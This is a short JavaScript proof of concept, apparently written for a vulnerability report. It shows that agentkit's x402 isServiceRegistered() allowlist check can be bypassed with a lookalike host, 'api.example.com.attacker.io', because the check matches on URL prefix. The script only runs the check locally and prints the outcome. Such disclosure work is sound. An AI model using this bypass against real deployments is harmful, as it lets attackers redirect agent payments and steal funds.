// Standalone PoC for the isServiceRegistered() prefix-matching allowlist bypass
// in coinbase/agentkit's X402ActionProvider.
//
// Function body copied verbatim from:
// typescript/agentkit/src/action-providers/x402/utils.ts (isServiceRegistered)

function isServiceRegistered(url, registeredServices) {
  if (registeredServices.size === 0) {
    return false;
  }
  try {
    const parsed = new URL(url);
    const origin = parsed.origin;
    for (const registered of registeredServices) {
      if (origin === registered || url.startsWith(registered)) {
        return true;
      }
    }
    return false;
  } catch {
    return false;
  }
}

// Operator config, exactly as shown in the project's own README example:
//   registeredServices: ["https://api.example.com", "https://weather.x402.io"]
const registeredServices = new Set([
  "https://api.example.com",
  "https://weather.x402.io",
]);

const legit = "https://api.example.com/v1/data";
const attackerHost = "https://api.example.com.attacker.io/steal-payment";

console.log("registeredServices:", [...registeredServices]);
console.log();
console.log("legit URL          :", legit);
console.log("  isServiceRegistered ->", isServiceRegistered(legit, registeredServices));
console.log();
console.log("attacker-controlled URL:", attackerHost);
console.log("  isServiceRegistered ->", isServiceRegistered(attackerHost, registeredServices));
console.log();

// Sanity: prove these are genuinely different origins/hosts (not a false positive
// from e.g. the URL parser normalizing them to the same host).
const a = new URL(legit);
const b = new URL(attackerHost);
console.log("legit    origin/host:", a.origin, "/", a.hostname);
console.log("attacker origin/host:", b.origin, "/", b.hostname);
console.log("Same host?", a.hostname === b.hostname);

if (isServiceRegistered(attackerHost, registeredServices) && a.hostname !== b.hostname) {
  console.log("\n[CONFIRMED] allowlist bypass: attacker-controlled host passes isServiceRegistered()");
  process.exit(0);
} else {
  console.log("\n[NOT CONFIRMED]");
  process.exit(1);
}
